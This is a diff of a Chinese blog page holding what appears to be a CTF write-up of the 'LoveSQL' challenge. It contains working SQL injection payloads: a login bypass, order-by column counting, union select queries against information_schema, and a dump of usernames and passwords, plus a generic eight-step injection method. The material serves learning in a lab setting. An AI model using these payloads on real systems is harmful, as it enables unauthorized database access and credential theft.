@@ -19,12 +19,12 @@
   <meta name="author" content="野草">
   <meta name="keywords" content="野草">
   
-    <meta name="description" content="tag:sql注入  打开页面。尝试万能密码 12用户名：1&#x27; or 1&#x3D;1#密码：123（随便输）  发现一段md5值，无法破解。但是还是发现了有用的信息，登录网页为http:&#x2F;&#x2F;3b703e72-a7b6-4b38-b41b-957ffa5a55f4.node5.buuoj.cn:81&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;cdc8d87e29">
+    <meta name="description" content="tag:sql注入  打开页面。 尝试万能密码 12用户名：1&#x27; or 1&#x3D;1#密码：123（随便输）  发现一段md5值，无法破解。 但是还是发现了有用的信息，登录网页为http:&#x2F;&#x2F;3b703e72-a7b6-4b38-b41b-957ffa5a55f4.node5.buuoj.cn:81&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;cdc">
 <meta property="og:type" content="website">
 <meta property="og:title" content="LoveSQL">
 <meta property="og:url" content="https://ycqaq233.github.io/WriteUp/Web/LoveSQL.html">
 <meta property="og:site_name" content="野草">
-<meta property="og:description" content="tag:sql注入  打开页面。尝试万能密码 12用户名：1&#x27; or 1&#x3D;1#密码：123（随便输）  发现一段md5值，无法破解。但是还是发现了有用的信息，登录网页为http:&#x2F;&#x2F;3b703e72-a7b6-4b38-b41b-957ffa5a55f4.node5.buuoj.cn:81&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;cdc8d87e29">
+<meta property="og:description" content="tag:sql注入  打开页面。 尝试万能密码 12用户名：1&#x27; or 1&#x3D;1#密码：123（随便输）  发现一段md5值，无法破解。 但是还是发现了有用的信息，登录网页为http:&#x2F;&#x2F;3b703e72-a7b6-4b38-b41b-957ffa5a55f4.node5.buuoj.cn:81&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;cdc">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://ycqaq233.github.io/WriteUp/Web/img/lovesql.png">
 <meta property="og:image" content="https://ycqaq233.github.io/WriteUp/Web/img/lovesql2.png">
@@ -233,39 +233,24 @@
   <blockquote>
 <p>tag:sql注入</p>
 </blockquote>
-<p>打开页面。<img src="img/lovesql.png" srcset="/img/loading.gif" lazyload alt>尝试万能密码</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">用户名：<span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1#</span><br><span class="hljs-string">密码：123（随便输）</span><br></code></pre></td></tr></table></figure>
-<p><img src="img/lovesql2.png" srcset="/img/loading.gif" lazyload alt><br>
-发现一段md5值，无法破解。但是还是发现了有用的信息，登录网页为<code>http://3b703e72-a7b6-4b38-b41b-957ffa5a55f4.node5.buuoj.cn:81/check.php?username=admin&amp;password=cdc8d87e2999ddc6dec6a747ae7d5b9d</code>,其中<code>/check.php?</code>即为sql注入点。</p>
-<h1><span id="手动注入">手动注入</span></h1>
-<p>先查字段数。注意，在url中注入时符号<code>#</code>要转换成相应的url编码%23</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span>check.php?username<span class="hljs-operator">=</span>admin<span class="hljs-string">&#x27;order by 3%23&amp;password=cdc8d87e2999ddc6dec6a747ae7d5b9d</span><br></code></pre></td></tr></table></figure>
-<p>4时报错，所以有3个字段。用<code>union</code>查询测试注入点</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span>check.php?username<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,3%23&amp;password=1</span><br></code></pre></td></tr></table></figure>
-<p><img src="img/lovesql3.png" srcset="/img/loading.gif" lazyload alt><br>
-得知回显位为2、3。查询数据库版本</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span>check.php?username<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,database(),version()%23&amp;password=1</span><br></code></pre></td></tr></table></figure>
-<p>得知数据库名为geek<br>
-<img src="img/lovesql4.png" srcset="/img/loading.gif" lazyload alt><br>
-接下来爆表。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span>check.php?username<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23&amp;password=1</span><br></code></pre></td></tr></table></figure>
-<p><img src="img/lovesql5.png" srcset="/img/loading.gif" lazyload alt><br>
-尝试一下l0ve1ysq1这个表</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">/check.php?<span class="hljs-attribute">username</span>=1&#x27; union select 1,2,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_schema</span>=database() <span class="hljs-keyword">and</span> <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;l0ve1ysq1&#x27;</span>%23&amp;password=1<br></code></pre></td></tr></table></figure>
-<p>查到三个字段。<img src="img/lovesql6.png" srcset="/img/loading.gif" lazyload alt><br>
-报数据</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">/check.php?<span class="hljs-attribute">username</span>=1&#x27; union select 1,2,group_concat(id,username,password) <span class="hljs-keyword">from</span> l0ve1ysq1%23&amp;<span class="hljs-attribute">password</span>=1<br></code></pre></td></tr></table></figure>
-<p>得到flag<br>
-<img src="img/lovesql7.png" srcset="/img/loading.gif" lazyload alt></p>
-<h2><span id="总结">总结</span></h2>
-<p>sql注入典型步骤<br>
-1.寻找注入点。可以先试着用万能密码登录admin账号，再以admin账号的用户名和密码作为注入点。注入点一般形如/xyz.php?payload=1<br>
-2.查询字段个数。用<code>'order by x#</code>来查询，改变x的值，根据页面的变化来判断字段个数。<br>
-3.查询回显位，用形如<code>payload=1' union select 1,2,3#</code>的方式来检测回显位。将要查询的数据放在回显位上。<br>
-4.注出数据库类型，用<code>payload=1' union select 1,database(),version()#</code>查询。<br>
-5.爆库。<code>payload=-1 union select 1,group_concat(schema_name) from information_schema.schemata</code><br>
-6.爆表。payload如下：<code>payload=1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#</code>解释一下其中的含义：前半句<code>group_concat(table_name) from information_schema.tables</code>的意思是，mysql有一个数据库存储着其他数据库的信息，这个数据库就是information_schema，它的tables字段存储着所有的表名。后半段的意思是条件为当前数据库，所以这句话的意思是查找当前数据库中所有的表名。<br>
-7.爆列名。payload如下：<code>payload=1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='l0ve1ysq1'#</code><br>
+<p>打开页面。<img src="img/lovesql.png" srcset="/img/loading.gif" lazyload> 尝试万能密码 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">用户名：<span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1#</span><br><span class="hljs-string">密码：123（随便输）</span><br></code></pre></td></tr></table></figure>
+<img src="img/lovesql2.png" srcset="/img/loading.gif" lazyload> 发现一段md5值，无法破解。
+但是还是发现了有用的信息，登录网页为<code>http://3b703e72-a7b6-4b38-b41b-957ffa5a55f4.node5.buuoj.cn:81/check.php?username=admin&amp;password=cdc8d87e2999ddc6dec6a747ae7d5b9d</code>,其中<code>/check.php?</code>即为sql注入点。
+# 手动注入
+先查字段数。注意，在url中注入时符号<code>#</code>要转换成相应的url编码%23
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span>check.php?username<span class="hljs-operator">=</span>admin<span class="hljs-string">&#x27;order by 3%23&amp;password=cdc8d87e2999ddc6dec6a747ae7d5b9d</span><br></code></pre></td></tr></table></figure> 4时报错，所以有3个字段。
+用<code>union</code>查询测试注入点 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span>check.php?username<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,3%23&amp;password=1</span><br></code></pre></td></tr></table></figure> <img src="img/lovesql3.png" srcset="/img/loading.gif" lazyload> 得知回显位为2、3。 查询数据库版本
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span>check.php?username<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,database(),version()%23&amp;password=1</span><br></code></pre></td></tr></table></figure> 得知数据库名为geek <img src="img/lovesql4.png" srcset="/img/loading.gif" lazyload>
+接下来爆表。 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span>check.php?username<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23&amp;password=1</span><br></code></pre></td></tr></table></figure> <img src="img/lovesql5.png" srcset="/img/loading.gif" lazyload>
+尝试一下l0ve1ysq1这个表 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">/check.php?<span class="hljs-attribute">username</span>=1&#x27; union select 1,2,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_schema</span>=database() <span class="hljs-keyword">and</span> <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;l0ve1ysq1&#x27;</span>%23&amp;password=1<br></code></pre></td></tr></table></figure> 查到三个字段。 <img src="img/lovesql6.png" srcset="/img/loading.gif" lazyload> 报数据 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">/check.php?<span class="hljs-attribute">username</span>=1&#x27; union select 1,2,group_concat(id,username,password) <span class="hljs-keyword">from</span> l0ve1ysq1%23&amp;<span class="hljs-attribute">password</span>=1<br></code></pre></td></tr></table></figure> 得到flag <img src="img/lovesql7.png" srcset="/img/loading.gif" lazyload> ## 总结 sql注入典型步骤
+1.寻找注入点。可以先试着用万能密码登录admin账号，再以admin账号的用户名和密码作为注入点。注入点一般形如/xyz.php?payload=1
+2.查询字段个数。用<code>'order by x#</code>来查询，改变x的值，根据页面的变化来判断字段个数。
+3.查询回显位，用形如<code>payload=1' union select 1,2,3#</code>的方式来检测回显位。将要查询的数据放在回显位上。
+4.注出数据库类型，用<code>payload=1' union select 1,database(),version()#</code>查询。
+5.爆库。<code>payload=-1 union select 1,group_concat(schema_name) from information_schema.schemata</code>
+6.爆表。payload如下：<code>payload=1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#</code>
+解释一下其中的含义：前半句<code>group_concat(table_name) from information_schema.tables</code>的意思是，mysql有一个数据库存储着其他数据库的信息，这个数据库就是information_schema，它的tables字段存储着所有的表名。后半段的意思是条件为当前数据库，所以这句话的意思是查找当前数据库中所有的表名。
+7.爆列名。payload如下：<code>payload=1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='l0ve1ysq1'#</code>
 8.爆字段。<code>payload=1' union select 1,2,group_concat(id,username,password) from l0ve1ysq1#</code></p>
 
 
